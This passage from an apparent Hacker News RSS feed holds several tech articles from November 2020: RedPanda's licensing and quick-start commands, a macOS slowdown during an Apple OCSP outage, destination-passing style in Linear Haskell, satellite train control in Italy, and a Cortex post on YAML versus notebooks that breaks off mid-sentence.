</ul>
</li>
</ul>
<ol>
<li>
<ol>
<li>
<ol>
<li><span>Our feed-based information architecture is obsessed with the present.</span></li>
<li><span>We consume information recreationally, not as a way to achieve our goals.</span></li>
<li><span>Curation has been too focused on the information and not enough on architecture; how we collect, store, augment, and utilize what’s already in our minds.” — Sari Azout</span></li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>
<li><span>“Without an information architecture that supports a longer shelf life for content, we will continue to accumulate mental and behavioral debt.” — Sari Azout</span></li>
<li><span>“What’s amazing is how chronological feeds — essentially accidental experiments of digital architecture — have rewired our brains. In the feed, everything is fleeting. This design property means you’re either always on and connected, or you’re off and wondering if you’re missing something important.” — Sari Azout</span></li>
<li><span>“In short, the architecture of digital platforms has made us obsessive documenters and consumers of the present, yet largely indifferent to the archives we create.” — Sari Azout</span></li>
<li><span>“Blending curation and community to inhabit a space I call: new media. On the community side, we’re witnessing a shift towards a post-social media era defined by niche, gated communities of interest and purpose.” — Sari Azout</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>You might be wondering why I included this in the wealthy section. It’s not a bad question! After reading this piece, I immediately thought about the amount of opportunities the “online communities at the intersection of content curation and knowledge management” space presents…I highly suggest following Sari Azout [</span><a href="https://twitter.com/sariazout"><b><i>here</i></b></a><span>] as she’s going to be announcing what she’s been working on soon 👀 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!--</a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076142</guid>
            <pubDate>Thu, 12 Nov 2020 22:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RedPanda: 10x Faster Kafka]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25075739">thread link</a>) | @sorenbs
<br/>
November 12, 2020 | https://vectorized.io/open-source/ | <a href="https://web.archive.org/web/*/https://vectorized.io/open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><img src="https://vectorized.io/5fec7d1698c66e160017f1ad37732a09/redpanda-bsl.svg" alt="always"></p></div>
<p>We are building a real-time streaming engine for modern applications - from the enterprise to
the solo dev prototyping a react application on her laptop. We go beyond the Kafka protocol,
into the future of streaming with inline WASM transforms and geo-replicated hierarchical storage.
A new platform that scales with you from the smallest projects to petabytes of data distributed across the globe. </p>
<h2 id="Background">Background<a href="#Background" aria-label="Background permalink"></a></h2>
<p>As easy to run as <code>nginx</code>. No dependencies. Ability to flush to disk with <code>acks=-1</code>.
Leverage a huge and active ecosystem. It must be fast, really fast. With this wishlist
in mind, I wrote the first line of code of what eventually became <code>redpanda</code>. It was January 7th,
2019 and I was still living in Miami before relocating to San Francisco. I hadn’t had as much
fun hacking on anything since the initial prototype of my previous project &amp; company <a href="http://www.concord.io/" target="_self" rel="nofollow">concord.io</a>
and… it was equally all-consuming.</p>
<p>Here we are today, 22 months later. A team one dreams to be part of and a product we feel proud to
share with you. Ready to be put through the paces in even more ways that we could have anticipated,
whether embedding Redpanda in a security appliance, or using it as part of your new NodeJS application
because it’s so simple to use. Whoever you are, welcome! We are excited to have you in our community.</p>
<h2 id="Legal">Legal<a href="#Legal" aria-label="Legal permalink"></a></h2>
<p>The project is released under the Source Available License - BSL - similar to what our friends at CockroachDB have done.
We try to make this clear in the license, but worth reiterating here. Our intention is to deter cloud providers from offering our work as a service.
For 99.999% of you, restrictions will not apply - welcome to our community!</p>
<p>There will be enterprise, pay-only features that will be obvious, since to turn them on you have to
edit the <code>enterprise</code> section of the configuration. </p>
<h2 id="Getting-Started">Getting Started<a href="#Getting-Started" aria-label="Getting Started permalink"></a></h2>
<p>The simplest thing you can do is run in Docker. Follow the <a href="https://vectorized.io/rpk-container">tutorial here</a>.
But for the truly impatient, here is the executive summary: </p>
<div data-language="text"><pre><code>$ rpk container start -n 3
NODE ID  ADDRESS          CONFIG                                             
  0        172.24.1.2:9092  /home/david/.rpk/cluster/node-0/conf/redpanda.yaml  
  1        172.24.1.4:9092  /home/david/.rpk/cluster/node-1/conf/redpanda.yaml  
  2        172.24.1.3:9092  /home/david/.rpk/cluster/node-2/conf/redpanda.yaml  

Cluster started! You may use 'rpk api' to interact with the cluster. E.g:

rpk api status</code></pre></div>
<p>It says we can check our cluster with <code>rpk api status</code> Let’s try that!</p>
<div data-language="text"><pre><code>$ rpk api status
  Redpanda Cluster Status                   
                                            
  0 (172.24.1.2:9092)      (No partitions)  
                                            
  1 (172.24.1.3:9092)      (No partitions)  
                                            
  2 (172.24.1.4:9092)      (No partitions)</code></pre></div>
<p>All of the <code>rpk api</code> subcommands will detect the local cluster and use its addresses, so you don’t have to configure anything or keep track of IPs and ports.</p>
<p>For example, you can run <code>rpk api topic create</code> and it will work!</p>
<div data-language="text"><pre><code>$ rpk api topic create -p 6 -r 3 new-topic
Created topic 'new-topic'. Partitions: 6, replicas: 3, cleanup policy: 'delete'</code></pre></div>
<h2 id="Thank-you">Thank you<a href="#Thank-you" aria-label="Thank you permalink"></a></h2>
<p>This decision comes after almost a year of thinking and mentorship with a very large group of experts, OSS enthusiasts,
lawyers and quiet time thinking. Special thanks to Peter Mattis from CockroachDB for sharing his experience with BSL
which ultimately made us feel comfortable with our decision to also choose BSL. Adam Jacob for sharing his experiences with Chef,
his never-ending expertise around licensing and for taking the time to walk me through business models with me.
Thanks to Ajay Kulkarni from TimescaleDB for sharing his wealth of knowledge and experience building a community.
Thanks to Megan Gill at MongoDB for helping me better understand OSS in general, and to Gaurav Gupta now at LSVP
for helping me understand Elastic a bit better and how the OSS+Source Available has matured in the last decade.
We are better because of your advice, I am forever thankful.</p></section></div>]]>
            </description>
            <link>https://vectorized.io/open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075739</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New macOS update slows down older versions, literally]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075736">thread link</a>) | @dewey
<br/>
November 12, 2020 | https://annoying.technology/posts/0f0325b37e2292f8/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/0f0325b37e2292f8/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/cbd3c98a693fe88041e8037587459629b3eef4a3/7c846/media/wellthatsjustgreat.png"></p><p>If you are running macOS you also run a service called <a href="https://www.howtogeek.com/331343/what-is-trustd-and-why-is-it-running-on-my-mac/">trustd</a> which is <a href="https://mjtsai.com/blog/2020/05/22/macos-10-15-slow-by-design/">verifying</a> the signature of installed apps. This service is calling <a href="http://ocsp.apple.com/">ocsp.apple.com</a> which is currently down, possibly related to the (also not accessible) software update service.</p><p>Result: Apps take minutes to start, your Mac grinds to a halt with no indication what’s going on.</p><p>Workarounds proposed <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489">on Twitter</a> include pointing ocsp.apple.com to localhost.</p><p>It just works!</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/0f0325b37e2292f8/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075736</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure destination-passing style in Linear Haskell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075718">thread link</a>) | @lelf
<br/>
November 12, 2020 | https://www.tweag.io/blog/2020-11-11-linear-dps/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-11-11-linear-dps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>My goal today is to convince you that destination-passing style is
neat, actually. And that <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> make
destination-passing purely functional. But first, I must answer a
question.</p>
<h2>What is destination-passing style?</h2>
<p>If you’ve ever programmed in C, C++, or Fortran, you are sure to have
encountered the style of programming which sometimes goes by the name
<em>destination-passing style</em>. It is the practice of writing, <em>e.g.</em> an
array-producing functions as, instead, taking an empty array as an
extra argument and filling it. Consider, for example, the C <code>strcpy</code> function:</p>
<div data-language="c"><pre><code><span>char</span><span>*</span> <span>strcpy</span> <span>(</span> <span>char</span><span>*</span> destination<span>,</span> <span>const</span> <span>char</span><span>*</span> source <span>)</span><span>;</span></code></pre></div>
<p>It copies the string in <code>source</code> to the array <code>destination</code> (it also
returns <code>destination</code> when it’s done).</p>
<p>The name “destination-passing style” itself seems to be more common in
the functional programming language compilation literature, however. C
programmers don’t appear to have a name for it. So it is likely that
you have never encountered it.</p>
<h2>But this is extremely imperative, why should I care?</h2>
<p>Why, indeed, care about destination-passing? It does let you ask a new
question: “whose responsibility is it to allocate the array?“. If I
were to write an array copy in Haskell, it would have type</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span></code></pre></div>
<p>And there is no way around <code>copyArray</code> allocating an array itself. The
question doesn’t even exist. With <code>strcpy</code>, I can either choose to
allocate an array, and pass it immediately to <code>strcpy</code>, or, I can
delegate the allocation of the array to someone else.</p>
<p>But, once I can ask this question, what can I do with it? I can
compose it! Let’s imagine that we have a function to split an array in
two</p>
<div data-language="haskell"><pre><code><span>splitArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span></code></pre></div>
<p>Now consider the following (admittedly not especially useful)
function:</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray2</span> <span>a</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>&lt;&gt;</span> <span>copyArray</span> <span>ar</span></code></pre></div>
<p>When the question doesn’t exist, each call to <code>copyArray</code> has, no matter what,
to allocate an array, which is then copied into a new array. It means
that we are making a superfluous copy of our original array,
only to discard it immediately. This is quite wasteful.</p>
<h2>Won’t fusion take care of that, though?</h2>
<p>Often, you can, indeed, rely on array fusion to avoid too egregious a
behaviour. Array fusion, such as implemented in the excellent <a href="https://hackage.haskell.org/package/vector">vector</a>
library will eliminate a ton of intermediate allocations.</p>
<p>However, fusion is unreliable. Sometimes, a simple refactoring will
push a function’s size beyond what GHC is willing to inline, and it
will break an entire fusion pipeline. Most of the time, this is fine,
but not when you are dependent on fusion happening. And if you need
GHC to produce code without allocations, why not write your program directly as you want
it, rather than try and coax the compiler into hopefully eliminating
the allocations for you.</p>
<p>This has been a guiding principle in the development of the linear
types project: <strong>compiler optimisations are great, as you don’t need
to think about a lot of things; until you do, and you find yourself
second-guessing the optimiser</strong>. When that happens, we want linear
types to empower you to write the code that you mean, without
sacrificing Haskell’s type safety.</p>
<p>Besides, in the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">article about F̃</a>, a restricted array-based
functional language which compiles to very efficient code, the authors
find significant performance gains for using destination-passing on
top of an array fusion optimisation. They only use destination-passing
in the optimiser, though, not as a language feature.</p>
<p>Finally, fusion doesn’t always work. Suppose I rewrite my <code>copyArray2</code>
function to use threads to better utilise my multicore architecture</p>
<div data-language="haskell"><pre><code><span>copyArray3</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>IO</span> <span>(</span><span>Array</span> <span>a</span><span>)</span>
<span>copyArray3</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>do</span>
    <span>(</span><span>bl</span><span>,</span> <span>br</span><span>)</span> <span>&lt;-</span> <span>concurrently</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>al</span><span>)</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>ar</span><span>)</span>
    <span>return</span> <span>$</span> <span>bl</span> <span>&lt;&gt;</span> <span>br</span></code></pre></div>
<p>This is beyond a fusion framework ability to optimise. Or maybe I want
to copy my array into a memory mapped buffer. The point is: fusion
will do a lot for you, just not everything.</p>
<h2>Ok, but does that mean I have to use ST everywhere?</h2>
<p>The obvious way to encode destination-passing style, in Haskell, is to
move all our computation to <code>ST</code>, so that <code>copyArray</code> would be</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>ST</span> <span>(</span><span>)</span></code></pre></div>
<p>But it’s not very congruent with how functional programmers write
their programs. It does lift all of the above limitations, at the
price of adding state everywhere, which is an entire error-inducing
surface that functional programming usually avoids.</p>
<p>It’s a huge price to pay, and that’s why the <a href="https://hackage.haskell.org/package/vector">vector</a> library is not
structured like this. It does feature mutable arrays, but immutable
arrays are very much encouraged.</p>
<p>This is where <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> help. Indeed, let’s take a
step back and ask: what makes a destination impure to begin with?</p>
<ul>
<li>If I read out a cell, then write to it, then read it again: I’ll see a
different result the second time.</li>
<li>If I write to the same cell twice, the writes need to be ordered,
otherwise the result would be non-deterministic.</li>
<li>Reading a cell which has not been initialised is non-deterministic
(though in most case, we can salvage this by initialising every cell
with <code>undefined</code>)</li>
</ul>
<p>All of these behaviours are prohibited in pure code. But we could
avoid all the prohibited behaviours if we could make sure that each
cell is written to exactly once before being read. Aha! Exactly once,
this is the sort of thing that linear types are good at! Ok, so let’s
try again:</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span></code></pre></div>
<p>This means that <code>copyArray</code> is a <em>pure</em> function which uses its destination
(in its entirety) exactly once. We only need to make sure that there
is only ever a unique pointer to a destination array, which we do with
the <code>alloc</code> function:</p>
<div data-language="haskell"><pre><code><span>alloc</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>(</span><span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span><span>)</span> ⊸ <span>Array</span> <span>a</span></code></pre></div>
<p>A destination is allocated for the scope of the linear function. At
the end of the function, we know that the destination has been fully
filled, and so we get an array out. From this destination-passing
version of <code>copyArray</code>, by the way, it is easy to retrieve the
direct style variant:</p>
<div data-language="haskell"><pre><code><span>copyArray</span>' <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray</span>' <span>a</span> <span>=</span> <span>alloc</span> <span>(</span><span>length</span> <span>a</span><span>)</span> <span>(</span><span>\</span><span>d</span> <span>-&gt;</span> <span>copyArray</span> <span>a</span> <span>d</span><span>)</span></code></pre></div>
<p>The reverse, as I’ve been arguing throughout this post, is very much
not true. So the destination-passing function is the more fundamental
one.</p>
<p>Now, to be able to implement <code>copyArray2</code>, we need a function which
splits destinations</p>
<div data-language="haskell"><pre><code><span>splitDArray</span> <span>::</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>Then, it is just a matter of following the types (the curious-looking <code>&amp; \case</code> construction is due to a limitation of the current
implementation of linear types in GHC, see <a href="https://github.com/tweag/linear-base/blob/8642e4209ffd663e1f1f35ddd977da0d073fa1af/docs/USER_GUIDE.md#case-statements-are-not-linear">here</a>)</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span>
<span>copyArray2</span> <span>a</span> <span>d</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>splitDArray</span> <span>d</span> <span>&amp;</span> <span>\</span><span>case</span>
    <span>(</span><span>dl</span><span>,</span> <span>dr</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>dl</span> <span>`lseq`</span> <span>copyArray</span> <span>ar</span> <span>dr</span></code></pre></div>
<p>Voilà! No superfluous allocation. Not because of the optimiser, but
because of the semantics of my program: it doesn’t allocate an array
anywhere.</p>
<p>You’ll find a more complete destination array interface in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Destination.hs">the
<code>Data.Array.Destination</code> module of linear-base</a>.</p>
<h2>Closing thoughts</h2>
<p>One of the features of linear types, is that they often allow to
expose as pure interfaces objects which appear to be intrinsically
impure. But I want to argue that, in the case of destinations, we’ve
actually done more than this: we’ve made the interface <em>better</em> than
the impure interface. Not because pure interfaces are better than
impure interfaces (though it’s a defensible position), but because the
linear destination interface is a more faithful representation of what
destinations mean.</p>
<p>There is no longer confusion about what is an input and what is an
output: inputs are <code>Array</code>, and outputs are <code>DArray</code>. Destinations are
there solely for output, they can’t be used as a temporary store of
data. And the types ensure that they are fully filled, and that we
don’t accidentally overwrite an output, by the time the destination is
read back as an array.</p>
<p>And this is pretty neat.</p>
<p>If you want to go a bit deeper into this particular brand of weed, let
me leave you with a handful of comments which you can take either as
closing this blog post, or opening new avenues.</p>
<ul>
<li>The <code>alloc</code> function takes a destination-consuming function as an
argument, instead of returning a destination directly. This style is
common in Linear Haskell, as a means to enforce uniqueness. It is
sometimes seen as a limitation of Linear Haskell’s design. However
in this particular case, the function is necessary to <em>delimit the
scope</em> of the destination. In fact, the <code>alloc</code> function is
virtually identical to that of the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">F̃ article</a>, where there
is no linear typing whatsoever.</li>
<li>Affine types (affine arguments are consumed <em>at most</em> once,
rather than <em>exactly</em> once for linear arguments) are sometimes
preferable to linear types. For instance affine types appear to
<a href="https://www.tweag.io/blog/2018-06-21-linear-streams/">represent streaming
computations better</a>. But
in the case of destinations we really do want linear types: it
wouldn’t make as much sense to return from <code>alloc</code> with a
partially-filled destination.</li>
<li>When using linear types to make a pure interface to array functions
which, in fact, mutate an array for efficiency (like in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Mutable/Linear.hs">this module
of linear
base</a>),
we lose the ability to alias the mutable array in exchange for
purity. Sometimes it’s a perfectly acceptable trade-off, but some
algorithms depend on sharing mutation for efficiency, these are not
available with linear pure mutable arrays. We are not making such a
trade-off for destinations: linear destinations, being pure output,
are, arguably, a more faithful interface for destination-passing
style than mutable array.</li>
<li>
<p>Have you noticed how in the destination-passing <code>copyArray2</code>, the
call to array concatenation from the direct-style implementation has
been replaced by a call to <code>splitDArray</code>? And, if you have, have you
also noticed the symmetry between these two functions?</p>
<div data-language="haskell"><pre><code><span>uncurry</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>::</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>splitDArray</span> <span>::</span> <span>Darray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>This is not a coincidence. There is a sort of duality between
destinations and constructors. This …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tweag.io/blog/2020-11-11-linear-dps/">https://www.tweag.io/blog/2020-11-11-linear-dps/</a></em></p>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-11-11-linear-dps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075718</guid>
            <pubDate>Thu, 12 Nov 2020 22:03:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trains in Italy to be tracked and controlled via space]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075333">thread link</a>) | @finphil
<br/>
November 12, 2020 | https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites | <a href="https://web.archive.org/web/*/https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="634615317096710144">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites"><h2>Trains in Italy to be tracked and controlled via space</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/b4f89edf40673685a7cc1905aaef43ea/15de201cd5d5d058-0b/s1280x1920/96ebbdebadfb6f2986c6f304dcb9c523eaf530db.png" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.esa.int%2F&amp;t=MWFkM2I1NjdjZTZiZDk3ODhlNzk5MjYzZGRmOWZmNjI1NGM2ZDE3MSwwOVBpSDFCUg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634615317096710144%2Ftrains-in-italy-tracked-and-controlled-by-satellites&amp;m=0&amp;ts=1605414190">European Space Agency</a> -</b></p><p>

Trains in Italy will be tracked and controlled via space to ensure they run in a safe, punctual and environmentally friendly way.<br></p><p>The project could see satellite technology become a standard way to run trains across the whole of Europe.<br></p><p>The Italian national railway company, Gruppo FS Italiane, is installing systems that will use satellites to monitor the speed of trains on its lines and automatically control the signals ahead to slow any engine that is going too fast. The satellites will add capacity to the existing trackside radio systems.</p><p>The satellites will also monitor the distances between trains to avoid any collisions. The system will be more energy efficient than existing measures and therefore better for the environment.</p><p>Trains making the 40-kilometre journey between the Italian cities of Novara in the Piedmont region and Rho in the Lombardy region will be the first to use the system, which was originally conceived in 2012 and has since undergone an extensive test campaign.</p><p>The project, called ERSAT, is part of the European Rail Traffic Management System, an EU initiative to integrate the separate national rail networks into a coherent Europe-wide system. Once it has demonstrated its success, it will allow satellite technologies to be certified for use under the scheme. This would increase the efficiency of the system, cutting costs and electricity use, and thereby reducing carbon emissions.</p><p>The ERSAT project is being implemented in coordination with the Italian Space Agency, with the support of ESA, and with the contribution of the EU’s European Global Navigation Satellite Systems Agency.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.esa.int%2FApplications%2FTelecommunications_Integrated_Applications%2FSatellites_to_track_trains_and_promote_rail_safety&amp;t=MmNhODY1M2QyZmMwZWFhODUwZDVmYTViMTZhMTgxOGE0YzMwOWY4NiwwOVBpSDFCUg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634615317096710144%2Ftrains-in-italy-tracked-and-controlled-by-satellites&amp;m=0&amp;ts=1605414190">European Space Agency</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/178182912782/alstom-first-hydrogen-train">Alstom introduces the first hydrogen train</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/trains">trains</a>
                                    
                                        <a href="https://nuadox.com/tagged/train">train</a>
                                    
                                        <a href="https://nuadox.com/tagged/satellite">satellite</a>
                                    
                                        <a href="https://nuadox.com/tagged/space">space</a>
                                    
                                        <a href="https://nuadox.com/tagged/ersat">ersat</a>
                                    
                                        <a href="https://nuadox.com/tagged/italy">italy</a>
                                    
                                        <a href="https://nuadox.com/tagged/transit">transit</a>
                                    
                                        <a href="https://nuadox.com/tagged/transport">transport</a>
                                    
                                        <a href="https://nuadox.com/tagged/transportation">transportation</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/634615317096710144/trains-in-italy-tracked-and-controlled-by-satellites</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075333</guid>
            <pubDate>Thu, 12 Nov 2020 21:29:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why we use YAML, not notebooks, for machine learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075305">thread link</a>) | @sheepstrat
<br/>
November 12, 2020 | http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning | <a href="https://web.archive.org/web/*/http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div content-type="article"><p>Most data scientists spend the majority of their working hours in a notebook. As a result, most production machine learning platforms prioritize notebook support. If you try out a new production ML platform, chances are its onboarding tutorial will begin with a .ipynb file.</p><p>When we built <a href="https://github.com/cortexlabs/cortex" target="_blank">Cortex</a> we spent a lot of time considering the correct interface for defining production ML pipelines. Ultimately, we decided <em>not</em> to support notebooks, opting instead for YAML config files.</p><h3>Notebooks were designed for experimentation</h3><p>Notebooks are the modern incarnation of literate programming, a paradigm introduced in the ‘80s that sought to write code that reflected the programmer’s thoughts—not the computer’s processing—by combining code with natural language.</p><p>In all literate programming tools, the emphasis is on presentation, which is a big reason why notebooks are so useful.</p><p>For many data scientists, the finished product of a work session is a business analysis. They need to show team members—who oftentimes aren’t technical—how their data became a specific recommendation or insight.</p><p>A notebook, where paragraphs of formatted text can lay between cells of code and where charts can be displayed directly beneath the code that generates them, is an ideal format for this presentation.</p><p>Even better, notebooks are interactive. Want to see what the chart looks like with a second dataset? Just add a new cell. Want to test a different model? Tweak one line of code and rerun the cell.</p><p>However, the same qualities that make notebooks great for exploring and explaining data make them a poor fit for production.</p><h3>Why we use YAML for production machine learning</h3><p>When I say production machine learning, I’m referring to machine learning that manifests as a product feature. For example, Uber’s ETA prediction, or Gmail’s Smart Compose.</p><p>The priorities in building a production machine learning pipeline—the series of steps that take you from raw data to product—are not fundamentally different from those of general software engineering. Specifically, they are:</p><h4>1. Your pipeline should be reproducible</h4><p>Reproducibility is an issue with notebooks. Because of the hidden state and the potential for arbitrary execution order, generating a result in a notebook isn’t always as simple as clicking “Run All.” Just having another engineer reproduce your results—let alone having your code run automatically as part of a pipeline—is a significant challenge.</p><p>Instead of trying to streamline a notebook’s various imports and function calls into a more easily reproducible script, why not use something simple and declarative like YAML?</p><p>For example, this this cortex.yaml file defines the deployment stage of a pipeline:</p><p>The code to be executed, predictor.py, is clear, as are its configuration variables. It’s simple, readable, and will produce predictable results.</p><p>Now, there are some projects focused on parameterizing notebooks so that they can be treated as pure functions, but it’s always felt like an unnecessary “square peg in a round hole” effort to me.</p><h4>2. Collaborating on your pipeline should be easy</h4><p>Version control is at the heart of any modern engineering org. The ability for multiple engineers to asynchronously contribute to a codebase is crucial—and with notebooks, it’s very hard.</p><p>Git works by tracking the plaintext differences between file versions. With code, this results in a very readable experience, where you can easily visualize what is changing and how it impacts the software:</p><figure id="w-node-d5436ba7f36f-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aeb4f157689fec70b5_1*q3gmY030tYrPFREYhjuGXA.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>Notebook files, however, are essentially giant JSON documents that contain the base-64 encoding of images and binary data. For a complex notebook, it would be extremely hard for anyone to read through a plaintext diff and draw meaningful conclusions—a lot of it would just be rearranged JSON and unintelligible blocks of base-64.</p><p>When you combine this with the frailty of complicated notebooks, where cells often need to be run in an arbitrary but precise order to generate the right result, it makes collaboration tricky.</p><p>For example, imagine you had an ETA prediction feature, and your pipeline relied on a complicated notebook to export a trained model. No one would be able to work on the notebook, as any small tweak might lead to invisible but cascading changes, such that your model performs poorly.</p><p>Trying to reverse engineer what changes caused the performance drop would be hopeless, both because of the unreadable nature of notebook diffs and because of the explainability problems mentioned earlier. Your pipeline would, in essence, have a “don’t touch it or it will break” sign on it.</p><p>With YAML, however, this problem is solved. There is no hidden state or arbitrary execution order in a YAML file, and any changes you make to it can easily be tracked by Git:</p><figure id="w-node-e3057d2124b7-258b12d0"><p><img src="https://uploads-ssl.webflow.com/5f6030edfd63364a668b1265/5fada6aefc44fcdc3d9da40a_1*KJDREXDrxueoMiPyfjewhg.png" alt=""></p><figcaption><a href="https://github.com/cortexlabs/cortex" target="_blank"></a></figcaption></figure><p>If one of those changes breaks your model, it’s both reversible and investigable.</p><p>As with the last example, there are some projects dedicated to making diffing and merging notebooks easier, but it seems like a lot of effort to emulate YAML’s default nature.</p><h4>3. All code in your pipeline should be testable</h4><p>Connected to both of the above points, most modern engineering orgs (hopefully) have a process for testing code. Typically, it looks something like this:</p><ul role="list"><li>Engineers write tests before pushing any code.</li><li>PRs are automatically reviewed by CI/CD tooling.</li><li>A final manual review is given by another engineer.</li></ul><p>As a result, anytime the codebase is changed, it is done with the highest possible level of confidence that it will not break things.</p><p>With 